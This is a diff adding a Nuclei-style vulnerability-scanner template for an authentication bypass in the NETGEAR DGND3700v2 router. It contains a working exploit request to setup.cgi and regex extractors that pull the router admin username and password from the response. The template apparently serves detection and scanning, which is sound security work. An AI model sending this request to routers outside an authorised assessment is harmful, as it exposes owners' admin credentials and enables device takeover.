@@ -1,0 +1,37 @@
+id: netgear-dgnd3700v2-auth-bypass
+info:
+  name: NETGEAR DGND3700v2 setup.cgi Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    NETGEAR DGND3700v2 has an authentication bypass vulnerability. Attackers can use the vulnerability to read user account passwords and access sensitive information pages.
+  reference:
+    - https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/
+http:
+  - raw:
+      - |
+        GET /setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Router Admin Username</span>"
+          - "Router Admin Password"
+    extractors:
+      - type: regex
+        name: username
+        part: body
+        regex:
+          - "Router Admin Username</span>:&nbsp;(.*?)</td>"
+        internal: true
+      - type: regex
+        name: password
+        part: body
+        regex:
+          - "Router Admin Password</span>:&nbsp;(.*?)</td>"
+        internal: true
